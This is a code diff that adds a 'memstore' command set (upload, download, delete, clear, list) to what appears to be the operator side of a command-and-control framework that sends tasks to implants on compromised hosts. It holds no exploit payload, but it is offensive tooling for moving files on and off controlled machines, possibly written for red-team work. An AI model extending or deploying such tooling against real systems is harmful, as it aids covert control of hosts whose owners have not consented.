@@ -101,6 +101,11 @@ async def task_tree(command, args, implant_uuid):
                 StratActive,
                 FileDownload,
                 FileUpload,
+                MemStoreUpload,
+                MemStoreDownload,
+                MemStoreDelete,
+                MemStoreClear,
+                MemStoreList,
                 Exit,
             ]
             descriptions: list = get_description_of_dataclasses(dataclasses)
@@ -242,6 +247,72 @@ async def task_tree(command, args, implant_uuid):
                 return (
                     ResultType.ERROR,
                     "Invalid file command. Use `file upload <file_path>` or `file download <file_path>`",
+                )
+
+        case "memstore":
+            if args.startswith("upload"):
+                raw_args = args[7:]  # Extract file name after "upload"
+                args_list = raw_args.split()
+                # The file name is the first argument after "upload"
+                file_name = args_list[0]
+                # The file contents is the second argument after "upload"
+                # replace " " with "" to remove any spaces that could be trailing/leading, which may cause problems with base64 decoding
+                file_contents = (args_list[1]).replace(" ", "")
+
+                try:
+                    task = MemStoreUpload(
+                        implant_uuid=implant_uuid,
+                        file_name=file_name,
+                        file_contents=file_contents,
+                    ).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
+            elif args.startswith("download"):
+                raw_args = args[9:]  # Extract file name after "download"
+                args_list = raw_args.split()
+                # The file name is the first argument after "download"
+                file_name = args_list[0]
+
+                try:
+                    task = MemStoreDownload(
+                        implant_uuid=implant_uuid, file_name=file_name
+                    ).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
+
+            elif args.startswith("delete"):
+                raw_args = args[7:]  # Extract file name after "delete"
+                args_list = raw_args.split()
+                # The file name is the first argument after "delete"
+                file_name = args_list[0]
+
+                try:
+                    task = MemStoreDelete(
+                        implant_uuid=implant_uuid, file_name=file_name
+                    ).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
+
+            elif args.startswith("clear"):
+                try:
+                    task = MemStoreClear(implant_uuid=implant_uuid).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
+            elif args.startswith("list"):
+                try:
+                    task = MemStoreList(implant_uuid=implant_uuid).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
+
+            else:
+                return (
+                    ResultType.ERROR,
+                    "Invalid memstore command.",
                 )
 
         case "exit":
@@ -507,6 +578,155 @@ class FileUpload:
         bytes_file_contents = base64.b64decode(self.file_contents)
 
         task_args = {"file_path": self.file_path, "file_contents": bytes_file_contents}
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass(frozen=True)
+class MemStoreUpload:
+    R"""
+    Upload a file to the host the implant is running on. Ex: `memstore upload <file_name> <base64 file contents>`
+    """
+
+    command_name = "memstore upload"
+    implant_uuid: str
+    file_name: str
+    file_contents: str  # start with base64. figure out the upload button later
+
+    def __post_init__(self):
+        """Automatically run something when the dataclass is created."""
+        if not self.file_name:
+            raise ParseError(
+                "The 'file_name' argument cannot be None or empty. Ex: `memstore upload <base64 data>`: `memstore upload aabbcc==`"
+            )
+        if not self.file_contents:
+            raise ParseError(
+                "The 'file_contents' argument cannot be None or empty. Ex: `memstore upload <base64 data>`: `memstore upload aabbcc==`"
+            )
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+        # convert from base64, to bytes, for easier CLI handling
+        try:
+            bytes_file_contents = base64.b64decode(self.file_contents)
+
+            task_args = {
+                "file_name": self.file_name,
+                "file_contents": bytes_file_contents,
+            }
+            task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+            final_task = create_and_verify_task(
+                implant_uuid=self.implant_uuid, task=task_detail
+            )
+            return final_task
+        except Exception as e:
+            # likely base64 err. could  handle this better.
+            raise ParseError
+
+
+@dataclass(frozen=True)
+class MemStoreDownload:
+    R"""
+    Download a file from the host the implant is running on. Ex: `memstore download <file_name>`
+    """
+
+    command_name = "memstore download"
+    implant_uuid: str
+    file_name: str
+
+    def __post_init__(self):
+        """Automatically run something when the dataclass is created."""
+        if not self.file_name:
+            raise ParseError(
+                "The 'file_name' argument cannot be None or empty. Ex: `memstore download <file_name>`: `memstore download example.txt`"
+            )
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+        # convert from base64, to bytes, for easier CLI handling
+
+        task_args = {
+            "file_name": self.file_name,
+        }
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass(frozen=True)
+class MemStoreDelete:
+    R"""
+    Delete a file from the host the implant is running on. Ex: `memstore delete <file_name>`
+    """
+
+    command_name = "memstore delete"
+    implant_uuid: str
+    file_name: str
+
+    def __post_init__(self):
+        """Automatically run something when the dataclass is created."""
+        if not self.file_name:
+            raise ParseError(
+                "The 'file_name' argument cannot be None or empty. Ex: `memstore delete <file_name>`: `memstore delete not_more_malware`"
+            )
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+        # convert from base64, to bytes, for easier CLI handling
+
+        task_args = {"file_name": self.file_name}
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass(frozen=True)
+class MemStoreClear:
+    R"""
+    Delete a file from the host the implant is running on. Ex: `memstore delete <file_name>`
+    """
+
+    command_name = "memstore clear"
+    implant_uuid: str
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+        # convert from base64, to bytes, for easier CLI handling
+
+        task_args = {}
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass(frozen=True)
+class MemStoreList:
+    R"""
+    List all files in the memstore. Ex: `memstore list`
+    """
+
+    command_name = "memstore list"
+    implant_uuid: str
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+        # convert from base64, to bytes, for easier CLI handling
+
+        task_args = {}
         task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
